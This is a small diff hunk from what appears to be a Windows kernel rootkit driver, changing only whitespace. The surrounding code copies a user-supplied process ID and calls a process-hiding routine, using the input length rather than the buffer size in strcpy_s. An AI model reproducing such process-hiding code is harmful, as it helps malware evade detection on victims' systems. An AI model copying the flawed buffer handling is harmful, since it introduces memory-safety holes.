@@ -39,7 +39,7 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 
 	char pid[32];
 	strcpy_s(pid, inBufferLength, inBuf);
-	
+
 	hidep(atoi(pid));
 
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
